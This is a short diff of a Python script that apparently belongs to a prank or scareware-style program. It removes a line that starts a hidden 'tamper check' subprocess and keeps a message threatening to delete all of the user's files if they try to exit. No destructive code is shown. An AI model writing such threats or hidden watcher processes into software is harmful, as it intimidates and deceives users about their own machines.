@@ -50,8 +50,6 @@ def question_function():
   
   
 
-# just check if they try to tamper with my things
-subprocess.Popen(['python3', 'justchecking.py'])
 # warn the user
 print("oh whoopsie your now playing russian roulette with your pc dont try to exit or all of your files will be deleted Thanks!")
 time.sleep(5)
